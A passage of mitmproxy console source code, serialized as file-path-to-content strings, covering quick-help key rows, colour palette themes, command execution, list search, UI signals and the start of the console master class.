\"Next tab\": BasicKeyHelp(\"tab\"),\n        }\n    elif widget == EventLog:\n        top_label = \"Events:\"\n        top_items |= {\n            \"Scroll down\": BasicKeyHelp(\"\u2193\"),\n            \"Scroll up\": BasicKeyHelp(\"\u2191\"),\n            \"Clear\": \"Clear\",\n        }\n    elif issubclass(widget, FocusEditor):\n        top_label = f\"Edit:\"\n        top_items |= {\n            \"Start edit\": BasicKeyHelp(\"\u23ce\"),\n            \"Stop edit\": BasicKeyHelp(\"esc\"),\n            \"Add row\": \"Add a row after cursor\",\n            \"Delete row\": \"Delete this row\",\n        }\n    else:\n        pass\n\n    bottom_label = \"Proxy:\"\n    bottom_items: HelpItems = {\n        \"Help\": \"View help\",\n    }\n    if is_root_widget:\n        bottom_items[\"Quit\"] = \"Exit the current view\"\n    else:\n        bottom_items[\"Back\"] = \"Exit the current view\"\n    bottom_items |= {\n        \"Events\": \"View event log\",\n        \"Options\": \"View options\",\n        \"Intercept\": \"Set intercept\",\n        \"Filter\": \"Set view filter\",\n    }\n    if focused_flow:\n        bottom_items |= {\n            \"Save flows\": \"Save listed flows to file\",\n            \"Clear list\": \"Clear flow list\",\n        }\n    bottom_items |= {\n        \"Layout\": \"Cycle to next layout\",\n        \"Switch\": \"Focus next layout pane\",\n        \"Follow new\": \"Set focus follow\",\n    }\n\n    label_len = max(len(top_label), len(bottom_label), 8) + 1\n    top_label = top_label.ljust(label_len)\n    bottom_label = bottom_label.ljust(label_len)\n\n    return QuickHelp(top_label, top_items, bottom_label, bottom_items)\n\n\ndef _make_row(label: str, items: HelpItems, keymap: Keymap) -> urwid.Columns:\n    cols = [\n        (len(label), urwid.Text(label)),\n    ]\n    for short, long in items.items():\n        if isinstance(long, BasicKeyHelp):\n            key_short = long.key\n        else:\n            b = keymap.binding_for_help(long)\n            if b is None:\n                continue\n            key_short = b.key_short()\n        txt = urwid.Text(\n            [\n                (\"heading_inactive\", key_short),\n                \" \",\n                short,\n            ],\n            wrap=\"clip\",\n        )\n        cols.append((14, txt))\n\n    return urwid.Columns(cols)\n", "mitmproxy/tools/console/palettes.py": "# Low-color themes should ONLY use the standard foreground and background\n# colours listed here:\n#\n# http://urwid.org/manual/displayattributes.html\n#\nfrom __future__ import annotations\n\nfrom collections.abc import Mapping\nfrom collections.abc import Sequence\n\n\nclass Palette:\n    _fields = [\n        \"background\",\n        \"title\",\n        # Status bar & heading\n        \"heading\",\n        \"heading_key\",\n        \"heading_inactive\",\n        # Help\n        \"key\",\n        \"head\",\n        \"text\",\n        # Options\n        \"option_selected\",\n        \"option_active\",\n        \"option_active_selected\",\n        \"option_selected_key\",\n        # List and Connections\n        \"method_get\",\n        \"method_post\",\n        \"method_delete\",\n        \"method_other\",\n        \"method_head\",\n        \"method_put\",\n        \"method_http2_push\",\n        \"scheme_http\",\n        \"scheme_https\",\n        \"scheme_ws\",\n        \"scheme_wss\",\n        \"scheme_tcp\",\n        \"scheme_udp\",\n        \"scheme_dns\",\n        \"scheme_quic\",\n        \"scheme_other\",\n        \"url_punctuation\",\n        \"url_domain\",\n        \"url_filename\",\n        \"url_extension\",\n        \"url_query_key\",\n        \"url_query_value\",\n        \"content_none\",\n        \"content_text\",\n        \"content_script\",\n        \"content_media\",\n        \"content_data\",\n        \"content_raw\",\n        \"content_other\",\n        \"focus\",\n        \"code_200\",\n        \"code_300\",\n        \"code_400\",\n        \"code_500\",\n        \"code_other\",\n        \"error\",\n        \"warn\",\n        \"alert\",\n        \"header\",\n        \"highlight\",\n        \"intercept\",\n        \"replay\",\n        \"mark\",\n        # Hex view\n        \"offset\",\n        # JSON/msgpack view\n        \"Token_Name_Tag\",\n        \"Token_Literal_String\",\n        \"Token_Literal_Number\",\n        \"Token_Keyword_Constant\",\n        # TCP flow details\n        \"from_client\",\n        \"to_client\",\n        # Grid Editor\n        \"focusfield\",\n        \"focusfield_error\",\n        \"field_error\",\n        \"editfield\",\n        # Commander\n        \"commander_command\",\n        \"commander_invalid\",\n        \"commander_hint\",\n    ]\n    _fields.extend([\"gradient_%02d\" % i for i in range(100)])\n    high: Mapping[str, Sequence[str]] | None = None\n    low: Mapping[str, Sequence[str]]\n\n    def palette(self, transparent: bool):\n        lst: list[Sequence[str | None]] = []\n        highback, lowback = None, None\n        if not transparent:\n            if self.high and self.high.get(\"background\"):\n                highback = self.high[\"background\"][1]\n            lowback = self.low[\"background\"][1]\n\n        for i in self._fields:\n            if transparent and i == \"background\":\n                lst.append([\"background\", \"default\", \"default\"])\n            else:\n                v: list[str | None] = [i]\n                low = list(self.low[i])\n                if lowback and low[1] == \"default\":\n                    low[1] = lowback\n                v.extend(low)\n                if self.high and i in self.high:\n                    v.append(None)\n                    high: list[str | None] = list(self.high[i])\n                    if highback and high[1] == \"default\":\n                        high[1] = highback\n                    v.extend(high)\n                elif highback and self.low[i][1] == \"default\":\n                    high = [None, low[0], highback]\n                    v.extend(high)\n                lst.append(tuple(v))\n        return lst\n\n\ndef gen_gradient(palette, cols):\n    for i in range(100):\n        palette[\"gradient_%02d\" % i] = (cols[i * len(cols) // 100], \"default\")\n\n\ndef gen_rgb_gradient(palette, cols):\n    parts = len(cols) - 1\n    for i in range(100):\n        p = i / 100\n        idx = int(p * parts)\n        t0 = cols[idx]\n        t1 = cols[idx + 1]\n        pp = p * parts % 1\n        t = (\n            round(t0[0] + (t1[0] - t0[0]) * pp),\n            round(t0[1] + (t1[1] - t0[1]) * pp),\n            round(t0[2] + (t1[2] - t0[2]) * pp),\n        )\n        palette[\"gradient_%02d\" % i] = (\"#%x%x%x\" % t, \"default\")\n\n\nclass LowDark(Palette):\n    \"\"\"\n    Low-color dark background\n    \"\"\"\n\n    low = dict(\n        background=(\"white\", \"black\"),\n        title=(\"white,bold\", \"default\"),\n        # Status bar & heading\n        heading=(\"white\", \"dark blue\"),\n        heading_key=(\"light cyan\", \"dark blue\"),\n        heading_inactive=(\"dark gray\", \"light gray\"),\n        # Help\n        key=(\"light cyan\", \"default\"),\n        head=(\"white,bold\", \"default\"),\n        text=(\"light gray\", \"default\"),\n        # Options\n        option_selected=(\"black\", \"light gray\"),\n        option_selected_key=(\"light cyan\", \"light gray\"),\n        option_active=(\"light red\", \"default\"),\n        option_active_selected=(\"light red\", \"light gray\"),\n        # List and Connections\n        method_get=(\"light green\", \"default\"),\n        method_post=(\"brown\", \"default\"),\n        method_delete=(\"light red\", \"default\"),\n        method_head=(\"dark cyan\", \"default\"),\n        method_put=(\"dark red\", \"default\"),\n        method_other=(\"dark magenta\", \"default\"),\n        method_http2_push=(\"dark gray\", \"default\"),\n        scheme_http=(\"dark cyan\", \"default\"),\n        scheme_https=(\"dark green\", \"default\"),\n        scheme_ws=(\"brown\", \"default\"),\n        scheme_wss=(\"dark magenta\", \"default\"),\n        scheme_tcp=(\"dark magenta\", \"default\"),\n        scheme_udp=(\"dark magenta\", \"default\"),\n        scheme_dns=(\"dark blue\", \"default\"),\n        scheme_quic=(\"brown\", \"default\"),\n        scheme_other=(\"dark magenta\", \"default\"),\n        url_punctuation=(\"light gray\", \"default\"),\n        url_domain=(\"white\", \"default\"),\n        url_filename=(\"dark cyan\", \"default\"),\n        url_extension=(\"light gray\", \"default\"),\n        url_query_key=(\"white\", \"default\"),\n        url_query_value=(\"light gray\", \"default\"),\n        content_none=(\"dark gray\", \"default\"),\n        content_text=(\"light gray\", \"default\"),\n        content_script=(\"dark green\", \"default\"),\n        content_media=(\"light blue\", \"default\"),\n        content_data=(\"brown\", \"default\"),\n        content_raw=(\"dark red\", \"default\"),\n        content_other=(\"dark magenta\", \"default\"),\n        focus=(\"yellow\", \"default\"),\n        code_200=(\"dark green\", \"default\"),\n        code_300=(\"light blue\", \"default\"),\n        code_400=(\"light red\", \"default\"),\n        code_500=(\"light red\", \"default\"),\n        code_other=(\"dark red\", \"default\"),\n        alert=(\"light magenta\", \"default\"),\n        warn=(\"brown\", \"default\"),\n        error=(\"light red\", \"default\"),\n        header=(\"dark cyan\", \"default\"),\n        highlight=(\"white,bold\", \"default\"),\n        intercept=(\"brown\", \"default\"),\n        replay=(\"light green\", \"default\"),\n        mark=(\"light red\", \"default\"),\n        # Hex view\n        offset=(\"dark cyan\", \"default\"),\n        # JSON/msgpack view\n        Token_Name_Tag=(\"dark green\", \"default\"),\n        Token_Literal_String=(\"dark blue\", \"default\"),\n        Token_Literal_Number=(\"light magenta\", \"default\"),\n        Token_Keyword_Constant=(\"dark magenta\", \"default\"),\n        # TCP flow details\n        from_client=(\"light blue\", \"default\"),\n        to_client=(\"light red\", \"default\"),\n        # Grid Editor\n        focusfield=(\"black\", \"light gray\"),\n        focusfield_error=(\"dark red\", \"light gray\"),\n        field_error=(\"dark red\", \"default\"),\n        editfield=(\"white\", \"default\"),\n        commander_command=(\"white,bold\", \"default\"),\n        commander_invalid=(\"light red\", \"default\"),\n        commander_hint=(\"dark gray\", \"default\"),\n    )\n    gen_gradient(\n        low,\n        [\"light red\", \"yellow\", \"light green\", \"dark green\", \"dark cyan\", \"dark blue\"],\n    )\n\n\nclass Dark(LowDark):\n    high = dict(\n        heading_inactive=(\"g58\", \"g11\"),\n        intercept=(\"#f60\", \"default\"),\n        option_selected=(\"g85\", \"g45\"),\n        option_selected_key=(\"light cyan\", \"g50\"),\n        option_active_selected=(\"light red\", \"g50\"),\n    )\n\n\nclass LowLight(Palette):\n    \"\"\"\n    Low-color light background\n    \"\"\"\n\n    low = dict(\n        background=(\"black\", \"white\"),\n        title=(\"dark magenta\", \"default\"),\n        # Status bar & heading\n        heading=(\"white\", \"black\"),\n        heading_key=(\"dark blue\", \"black\"),\n        heading_inactive=(\"black\", \"light gray\"),\n        # Help\n        key=(\"dark blue\", \"default\"),\n        head=(\"black\", \"default\"),\n        text=(\"dark gray\", \"default\"),\n        # Options\n        option_selected=(\"black\", \"light gray\"),\n        option_selected_key=(\"dark blue\", \"light gray\"),\n        option_active=(\"light red\", \"default\"),\n        option_active_selected=(\"light red\", \"light gray\"),\n        # List and Connections\n        method_get=(\"dark green\", \"default\"),\n        method_post=(\"brown\", \"default\"),\n        method_head=(\"dark cyan\", \"default\"),\n        method_put=(\"light red\", \"default\"),\n        method_delete=(\"dark red\", \"default\"),\n        method_other=(\"light magenta\", \"default\"),\n        method_http2_push=(\"light gray\", \"default\"),\n        scheme_http=(\"dark cyan\", \"default\"),\n        scheme_https=(\"light green\", \"default\"),\n        scheme_ws=(\"brown\", \"default\"),\n        scheme_wss=(\"light magenta\", \"default\"),\n        scheme_tcp=(\"light magenta\", \"default\"),\n        scheme_udp=(\"light magenta\", \"default\"),\n        scheme_dns=(\"light blue\", \"default\"),\n        scheme_quic=(\"brown\", \"default\"),\n        scheme_other=(\"light magenta\", \"default\"),\n        url_punctuation=(\"dark gray\", \"default\"),\n        url_domain=(\"dark gray\", \"default\"),\n        url_filename=(\"black\", \"default\"),\n        url_extension=(\"dark gray\", \"default\"),\n        url_query_key=(\"light blue\", \"default\"),\n        url_query_value=(\"dark blue\", \"default\"),\n        content_none=(\"black\", \"default\"),\n        content_text=(\"dark gray\", \"default\"),\n        content_script=(\"light green\", \"default\"),\n        content_media=(\"light blue\", \"default\"),\n        content_data=(\"brown\", \"default\"),\n        content_raw=(\"light red\", \"default\"),\n        content_other=(\"light magenta\", \"default\"),\n        focus=(\"black\", \"default\"),\n        code_200=(\"dark green\", \"default\"),\n        code_300=(\"light blue\", \"default\"),\n        code_400=(\"dark red\", \"default\"),\n        code_500=(\"dark red\", \"default\"),\n        code_other=(\"light red\", \"default\"),\n        error=(\"light red\", \"default\"),\n        warn=(\"brown\", \"default\"),\n        alert=(\"light magenta\", \"default\"),\n        header=(\"dark blue\", \"default\"),\n        highlight=(\"black,bold\", \"default\"),\n        intercept=(\"brown\", \"default\"),\n        replay=(\"dark green\", \"default\"),\n        mark=(\"dark red\", \"default\"),\n        # Hex view\n        offset=(\"dark blue\", \"default\"),\n        # JSON/msgpack view\n        Token_Name_Tag=(\"dark green\", \"default\"),\n        Token_Literal_String=(\"dark blue\", \"default\"),\n        Token_Literal_Number=(\"light magenta\", \"default\"),\n        Token_Keyword_Constant=(\"dark magenta\", \"default\"),\n        # TCP flow details\n        from_client=(\"dark blue\", \"default\"),\n        to_client=(\"dark red\", \"default\"),\n        # Grid Editor\n        focusfield=(\"black\", \"light gray\"),\n        focusfield_error=(\"dark red\", \"light gray\"),\n        field_error=(\"dark red\", \"black\"),\n        editfield=(\"black\", \"default\"),\n        commander_command=(\"dark magenta\", \"default\"),\n        commander_invalid=(\"light red\", \"default\"),\n        commander_hint=(\"light gray\", \"default\"),\n    )\n    gen_gradient(\n        low,\n        [\"light red\", \"yellow\", \"light green\", \"dark green\", \"dark cyan\", \"dark blue\"],\n    )\n\n\nclass Light(LowLight):\n    high = dict(\n        background=(\"black\", \"g100\"),\n        heading=(\"g99\", \"#08f\"),\n        heading_key=(\"#0ff,bold\", \"#08f\"),\n        heading_inactive=(\"g35\", \"g85\"),\n        replay=(\"#0a0,bold\", \"default\"),\n        option_selected=(\"black\", \"g85\"),\n        option_selected_key=(\"dark blue\", \"g85\"),\n        option_active_selected=(\"light red\", \"g85\"),\n    )\n\n\n# Solarized palette in Urwid-style terminal high-colour offsets\n# See: http://ethanschoonover.com/solarized\nsol_base03 = \"h234\"\nsol_base02 = \"h235\"\nsol_base01 = \"h240\"\nsol_base00 = \"h241\"\nsol_base0 = \"h244\"\nsol_base1 = \"h245\"\nsol_base2 = \"h254\"\nsol_base3 = \"h230\"\nsol_yellow = \"h136\"\nsol_orange = \"h166\"\nsol_red = \"h160\"\nsol_magenta = \"h125\"\nsol_violet = \"h61\"\nsol_blue = \"h33\"\nsol_cyan = \"h37\"\nsol_green = \"h64\"\n\n\nclass SolarizedLight(LowLight):\n    high = dict(\n        background=(sol_base00, sol_base3),\n        title=(sol_cyan, \"default\"),\n        text=(sol_base00, \"default\"),\n        # Status bar & heading\n        heading=(sol_base2, sol_base02),\n        heading_key=(sol_blue, sol_base03),\n        heading_inactive=(sol_base03, sol_base1),\n        # Help\n        key=(\n            sol_blue,\n            \"default\",\n        ),\n        head=(sol_base00, \"default\"),\n        # Options\n        option_selected=(sol_base03, sol_base2),\n        option_selected_key=(sol_blue, sol_base2),\n        option_active=(sol_orange, \"default\"),\n        option_active_selected=(sol_orange, sol_base2),\n        # List and Connections\n        method_get=(sol_green, \"default\"),\n        method_post=(sol_orange, \"default\"),\n        method_head=(sol_cyan, \"default\"),\n        method_put=(sol_red, \"default\"),\n        method_delete=(sol_red, \"default\"),\n        method_other=(sol_magenta, \"default\"),\n        method_http2_push=(\"light gray\", \"default\"),\n        scheme_http=(sol_cyan, \"default\"),\n        scheme_https=(\"light green\", \"default\"),\n        scheme_ws=(sol_orange, \"default\"),\n        scheme_wss=(\"light magenta\", \"default\"),\n        scheme_tcp=(\"light magenta\", \"default\"),\n        scheme_udp=(\"light magenta\", \"default\"),\n        scheme_dns=(\"light blue\", \"default\"),\n        scheme_quic=(sol_orange, \"default\"),\n        scheme_other=(\"light magenta\", \"default\"),\n        url_punctuation=(\"dark gray\", \"default\"),\n        url_domain=(\"dark gray\", \"default\"),\n        url_filename=(\"black\", \"default\"),\n        url_extension=(\"dark gray\", \"default\"),\n        url_query_key=(sol_blue, \"default\"),\n        url_query_value=(\"dark blue\", \"default\"),\n        focus=(sol_base01, \"default\"),\n        code_200=(sol_green, \"default\"),\n        code_300=(sol_blue, \"default\"),\n        code_400=(\n            sol_orange,\n            \"default\",\n        ),\n        code_500=(sol_red, \"default\"),\n        code_other=(sol_magenta, \"default\"),\n        error=(sol_red, \"default\"),\n        warn=(sol_orange, \"default\"),\n        alert=(sol_magenta, \"default\"),\n        header=(sol_blue, \"default\"),\n        highlight=(sol_base01, \"default\"),\n        intercept=(\n            sol_red,\n            \"default\",\n        ),\n        replay=(\n            sol_green,\n            \"default\",\n        ),\n        # Hex view\n        offset=(sol_cyan, \"default\"),\n        # JSON/msgpack view\n        Token_Name_Tag=(sol_green, \"default\"),\n        Token_Literal_String=(sol_cyan, \"default\"),\n        Token_Literal_Number=(sol_blue, \"default\"),\n        Token_Keyword_Constant=(sol_magenta, \"default\"),\n        # TCP flow details\n        from_client=(sol_blue, \"default\"),\n        to_client=(sol_red, \"default\"),\n        # Grid Editor\n        focusfield=(sol_base00, sol_base2),\n        focusfield_error=(sol_red, sol_base2),\n        field_error=(sol_red, \"default\"),\n        editfield=(sol_base01, \"default\"),\n        commander_command=(sol_cyan, \"default\"),\n        commander_invalid=(sol_orange, \"default\"),\n        commander_hint=(sol_base1, \"default\"),\n    )\n\n\nclass SolarizedDark(LowDark):\n    high = dict(\n        background=(sol_base2, sol_base03),\n        title=(sol_blue, \"default\"),\n        text=(sol_base1, \"default\"),\n        # Status bar & heading\n        heading=(sol_base2, sol_base01),\n        heading_key=(sol_blue + \",bold\", sol_base01),\n        heading_inactive=(sol_base1, sol_base02),\n        # Help\n        key=(\n            sol_blue,\n            \"default\",\n        ),\n        head=(sol_base2, \"default\"),\n        # Options\n        option_selected=(sol_base03, sol_base00),\n        option_selected_key=(sol_blue, sol_base00),\n        option_active=(sol_orange, \"default\"),\n        option_active_selected=(sol_orange, sol_base00),\n        # List and Connections\n        focus=(sol_base1, \"default\"),\n        method_get=(sol_green, \"default\"),\n        method_post=(sol_orange, \"default\"),\n        method_delete=(sol_red, \"default\"),\n        method_head=(sol_cyan, \"default\"),\n        method_put=(sol_red, \"default\"),\n        method_other=(sol_magenta, \"default\"),\n        method_http2_push=(sol_base01, \"default\"),\n        url_punctuation=(\"h242\", \"default\"),\n        url_domain=(\"h252\", \"default\"),\n        url_filename=(\"h132\", \"default\"),\n        url_extension=(\"h96\", \"default\"),\n        url_query_key=(\"h37\", \"default\"),\n        url_query_value=(\"h30\", \"default\"),\n        content_none=(sol_base01, \"default\"),\n        content_text=(sol_base1, \"default\"),\n        content_media=(sol_blue, \"default\"),\n        code_200=(sol_green, \"default\"),\n        code_300=(sol_blue, \"default\"),\n        code_400=(\n            sol_orange,\n            \"default\",\n        ),\n        code_500=(sol_red, \"default\"),\n        code_other=(sol_magenta, \"default\"),\n        error=(sol_red, \"default\"),\n        warn=(sol_orange, \"default\"),\n        alert=(sol_magenta, \"default\"),\n        header=(sol_blue, \"default\"),\n        highlight=(sol_base01, \"default\"),\n        intercept=(\n            sol_red,\n            \"default\",\n        ),\n        replay=(\n            sol_green,\n            \"default\",\n        ),\n        # Hex view\n        offset=(sol_cyan, \"default\"),\n        # JSON/msgpack view\n        Token_Name_Tag=(sol_green, \"default\"),\n        Token_Literal_String=(sol_cyan, \"default\"),\n        Token_Literal_Number=(sol_blue, \"default\"),\n        Token_Keyword_Constant=(sol_magenta, \"default\"),\n        # TCP flow details\n        from_client=(sol_blue, \"default\"),\n        to_client=(sol_red, \"default\"),\n        # Grid Editor\n        focusfield=(sol_base0, sol_base02),\n        focusfield_error=(sol_red, sol_base02),\n        field_error=(sol_red, \"default\"),\n        editfield=(sol_base1, \"default\"),\n        commander_command=(sol_blue, \"default\"),\n        commander_invalid=(sol_orange, \"default\"),\n        commander_hint=(sol_base00, \"default\"),\n    )\n    gen_rgb_gradient(\n        high, [(15, 0, 0), (15, 15, 0), (0, 15, 0), (0, 15, 15), (0, 0, 15)]\n    )\n\n\nDEFAULT = \"dark\"\npalettes = {\n    \"lowlight\": LowLight(),\n    \"lowdark\": LowDark(),\n    \"light\": Light(),\n    \"dark\": Dark(),\n    \"solarized_light\": SolarizedLight(),\n    \"solarized_dark\": SolarizedDark(),\n}\n", "mitmproxy/tools/console/commandexecutor.py": "import logging\nfrom collections.abc import Sequence\n\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy.tools.console import overlay\nfrom mitmproxy.tools.console import signals\n\n\nclass CommandExecutor:\n    def __init__(self, master):\n        self.master = master\n\n    def __call__(self, cmd: str) -> None:\n        if cmd.strip():\n            try:\n                ret = self.master.commands.execute(cmd)\n            except exceptions.CommandError as e:\n                logging.error(str(e))\n            else:\n                if ret is not None:\n                    if type(ret) == Sequence[flow.Flow]:\n                        signals.status_message.send(\n                            message=\"Command returned %s flows\" % len(ret)\n                        )\n                    elif type(ret) == flow.Flow:\n                        signals.status_message.send(message=\"Command returned 1 flow\")\n                    else:\n                        self.master.overlay(\n                            overlay.DataViewerOverlay(\n                                self.master,\n                                ret,\n                            ),\n                            valign=\"top\",\n                        )\n", "mitmproxy/tools/console/searchable.py": "import urwid\n\nfrom mitmproxy.tools.console import signals\n\n\nclass Highlight(urwid.AttrMap):\n    def __init__(self, t):\n        urwid.AttrMap.__init__(\n            self,\n            urwid.Text(t.text),\n            \"focusfield\",\n        )\n        self.backup = t\n\n\nclass Searchable(urwid.ListBox):\n    def __init__(self, contents):\n        self.walker = urwid.SimpleFocusListWalker(contents)\n        urwid.ListBox.__init__(self, self.walker)\n        self.search_offset = 0\n        self.current_highlight = None\n        self.search_term = None\n        self.last_search = None\n\n    def keypress(self, size, key: str):\n        if key == \"/\":\n            signals.status_prompt.send(\n                prompt=\"Search for\", text=\"\", callback=self.set_search\n            )\n        elif key == \"n\":\n            self.find_next(False)\n        elif key == \"N\":\n            self.find_next(True)\n        elif key == \"m_start\":\n            self.set_focus(0)\n            self.walker._modified()\n        elif key == \"m_end\":\n            self.set_focus(len(self.walker) - 1)\n            self.walker._modified()\n        else:\n            return super().keypress(size, key)\n\n    def set_search(self, text):\n        self.last_search = text\n        self.search_term = text or None\n        self.find_next(False)\n\n    def set_highlight(self, offset):\n        if self.current_highlight is not None:\n            old = self.body[self.current_highlight]\n            self.body[self.current_highlight] = old.backup\n        if offset is None:\n            self.current_highlight = None\n        else:\n            self.body[offset] = Highlight(self.body[offset])\n            self.current_highlight = offset\n\n    def get_text(self, w):\n        if isinstance(w, urwid.Text):\n            return w.text\n        elif isinstance(w, Highlight):\n            return w.backup.text\n        else:\n            return None\n\n    def find_next(self, backwards: bool):\n        if not self.search_term:\n            if self.last_search:\n                self.search_term = self.last_search\n            else:\n                self.set_highlight(None)\n                return\n        # Start search at focus + 1\n        if backwards:\n            rng = range(len(self.body) - 1, -1, -1)\n        else:\n            rng = range(1, len(self.body) + 1)\n        for i in rng:\n            off = (self.focus_position + i) % len(self.body)\n            w = self.body[off]\n            txt = self.get_text(w)\n            if txt and self.search_term in txt:\n                self.set_highlight(off)\n                self.set_focus(off, coming_from=\"above\")\n                self.body._modified()\n                return\n        else:\n            self.set_highlight(None)\n            signals.status_message.send(message=\"Search not found.\", expire=1)\n", "mitmproxy/tools/console/signals.py": "from __future__ import annotations\n\nfrom collections.abc import Callable\nfrom typing import Union\n\nfrom mitmproxy.utils import signals\n\nStatusMessage = Union[tuple[str, str], str]\n\n\n# Show a status message in the action bar\n# Instead of using this signal directly, consider emitting a log event.\ndef _status_message(message: StatusMessage, expire: int = 5) -> None: ...\n\n\nstatus_message = signals.SyncSignal(_status_message)\n\n\n# Prompt for input\ndef _status_prompt(\n    prompt: str, text: str | None, callback: Callable[[str], None]\n) -> None: ...\n\n\nstatus_prompt = signals.SyncSignal(_status_prompt)\n\n\n# Prompt for a single keystroke\ndef _status_prompt_onekey(\n    prompt: str, keys: list[tuple[str, str]], callback: Callable[[str], None]\n) -> None: ...\n\n\nstatus_prompt_onekey = signals.SyncSignal(_status_prompt_onekey)\n\n\n# Prompt for a command\ndef _status_prompt_command(partial: str = \"\", cursor: int | None = None) -> None: ...\n\n\nstatus_prompt_command = signals.SyncSignal(_status_prompt_command)\n\n\n# Call a callback in N seconds\ndef _call_in(seconds: float, callback: Callable[[], None]) -> None: ...\n\n\ncall_in = signals.SyncSignal(_call_in)\n\n# Focus the body, footer or header of the main window\nfocus = signals.SyncSignal(lambda section: None)\n\n# Fired when settings change\nupdate_settings = signals.SyncSignal(lambda: None)\n\n# Fired when a flow changes\nflow_change = signals.SyncSignal(lambda flow: None)\n\n# Pop and push view state onto a stack\npop_view_state = signals.SyncSignal(lambda: None)\n\n# Fired when the window state changes\nwindow_refresh = signals.SyncSignal(lambda: None)\n\n# Fired when the key bindings change\nkeybindings_change = signals.SyncSignal(lambda: None)\n", "mitmproxy/tools/console/master.py": "import asyncio\nimport contextlib\nimport mimetypes\nimport os.path\nimport shlex\nimport shutil\nimport stat\nimport subprocess\nimport sys\nimport tempfile\nimport threading\nfrom typing import TypeVar\n\nimport urwid\nfrom tornado.platform.asyncio import AddThreadSelectorEventLoop\n\nfrom mitmproxy import addons\nfrom mitmproxy import log\nfrom mitmproxy import master\nfrom mitmproxy import options\nfrom mitmproxy.addons import errorcheck\nfrom mitmproxy.addons import eventstore\nfrom mitmproxy.addons import intercept\nfrom mitmproxy.addons import readfile\nfrom mitmproxy.addons import view\nfrom mitmproxy.tools.console import consoleaddons\nfrom mitmproxy.tools.console import defaultkeys\nfrom mitmproxy.tools.console import keymap\nfrom mitmproxy.tools.console import palettes\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console import window\nfrom mitmproxy.utils import strutils\n\nT = TypeVar(\"T\", str, bytes)\n\n\nclass ConsoleMaster(master.Master):\n    def __init__(self, opts: options.Options) -> None:\n        super().__init__(opts)\n\n        self.view: view.View = view.View()\n        self.events = eventstore.EventStore()\n        self.events.sig_add.connect(self.sig_add_log)\n\n        self.stream_path = None\n        self.keymap = keymap.Keymap(self)\n        defaultkeys.map(self.keymap)\n        self.options.errored.connect(self.options_error)\n\n        self.addons.add(*addons.default_addons())\n        self.addons.add(\n            intercept.Intercept(),\n            self.view,\n            self.events,\n            readfile.ReadFile(),\n            consoleaddons.ConsoleAddon(self),\n            keymap.KeymapConfig(self),\n            errorcheck.ErrorCheck(repeat_errors_on_stderr=True),\n        )\n\n        self.window: window.Window | None = None\n\n    def __setattr__(self, name, value):\n        super().__setattr__(name, value)\n        signals.update_settings.send()\n\n    def options_error(self, exc) -> None:\n        signals.status_message.send(message=str(exc), expire=1)\n\n    def prompt_for_exit(self) -> None:\n        signals.status_prompt_onekey.send(\n            prompt=\"Quit\",\n            keys=[\n                (\"yes\", \"y\"),\n                (\"no\", \"n\"),\n            ],\n            callback=self.quit,\n        )\n\n    def sig_add_log(self, entry: log.LogEntry):\n        if log.log_tier(self.options.console_eventlog_verbosity) < log.log_tier(\n            entry.level\n        ):\n            return\n        if entry.level in (\"error\", \"warn\", \"alert\"):\n            signals.status_message.send(\n                message=(\n                    entry.level,\n                    f\"{entry.level.title()}: {str(entry.msg).lstrip()}\",\n                ),\n                expire=5,\n            )\n\n    def sig_call_in(self, seconds, callback):\n        def cb(*_):\n            return callback()\n\n        self.loop.set_alarm_in(seconds, cb)\n\n    @contextlib.contextmanager\n    def uistopped(self):\n        self.loop.stop()\n        try:\n            yield\n        finally:\n            self.loop.start()\n            self.loop.screen_size = None\n            self.loop.draw_screen()\n\n    def get_editor(self) -> str:\n        # based upon https://github.com/pallets/click/blob/main/src/click/_termui_impl.py\n        if m := os.environ.get(\"MITMPROXY_EDITOR\"):\n            return m\n        if m := os.environ.get(\"EDITOR\"):\n            return m\n        for editor in \"sensible-editor\", \"nano\", \"vim\":\n            if shutil.which(editor):\n                return editor\n        if os.name == \"nt\":\n            return \"notepad\"\n        else:\n            return \"vi\"\n\n    def get_hex_editor(self) -> str:\n        editors = [\"ghex\", \"bless\", \"hexedit\", \"hxd\", \"hexer\", \"hexcurse\"]\n        for editor in editors:\n            if shutil.which(editor):\n                return editor\n        return self.get_editor()\n\n    def spawn_editor(self, data: T) -> T:\n        text = isinstance(data, str)\n        fd, name = tempfile.mkstemp(\"\", \"mitmproxy\", text=text)\n        with_hexeditor = isinstance(data, bytes) and strutils.is_mostly_bin(data)\n        with open(fd, \"w\" if text else \"wb\") as f:\n            f.write(data)\n        if with_hexeditor:\n            c = self.get_hex_editor()\n        else:\n            c = self.get_editor()\n        cmd = shlex.split(c)\n        cmd.append(name)\n        with self.uistopped():\n            try:\n                subprocess.call(cmd)\n            except Exception:\n                signals.status_message.send(message=\"Can't start editor: %s\" % c)\n            else:\n                with open(name, \"r\" if text else \"rb\") as f:\n                    data = f.read()\n        os.unlink(name)\n        return data\n\n    def spawn_external_viewer(self, data, contenttype):\n        if contenttype:\n            contenttype = contenttype.split(\";\")[0]\n            ext = mimetypes.guess_extension(contenttype) or \"\"\n        else:\n            ext = \"\"\n        fd, name = tempfile.mkstemp(ext, \"mproxy\")\n        os.write(fd, data)\n        os.close(fd)\n\n        # read-only to remind the user that this is a view function\n        os.chmod(name, stat.S_IREAD)\n\n        # hm which one should get priority?\n        c = (\n            os.environ.get(\"MITMPROXY_EDITOR\")\n            or os.environ.get(\"PAGER\")\n            or os.environ.get(\"EDITOR\")\n        )\n        if not c:\n            c = \"less\"\n        cmd = shlex.split(c)\n        cmd.append(name)\n\n        with self.uistopped():\n            try:\n                subprocess.call(cmd, shell=False)\n            except Exception:\n                signals.status_message.send(\n                    message=\"Can't start external viewer: %s\" % \" \".join(c)\n                )\n        # add a small delay before deletion so that the file is not removed before being loaded by the viewer\n        t = threading.Timer(1.0, os.unlink, args=[name])\n        t.start()\n\n    def set_palette(self, *_) -> None:\n        self.ui.register_palette(\n            palettes.palettes[self.options.console_palette].palette(\n                self.options.console_palette_transparent\n            )\n        )\n        self.ui.clear()\n\n    def inject_key(self, key):\n        self.loop.process_input([key])\n\n    async def running(self) -> None:\n        if not sys.stdout.isatty():\n            print(\n                \"Error: mitmproxy's console interface requires a tty. \"\n                \"Please run mitmproxy in an interactive shell environment.\",\n                file=sys.stderr,\n            )\n            sys.exit(1)\n\n        detected_encoding = urwid.detected_encoding.lower()\n        if os.name != \"nt\" and detected_encoding and \"utf\" not in detected_encoding:\n            print(\n                f\"mitmproxy expects a UTF-8 console environment, not {urwid.detected_encoding!r}. \"\n                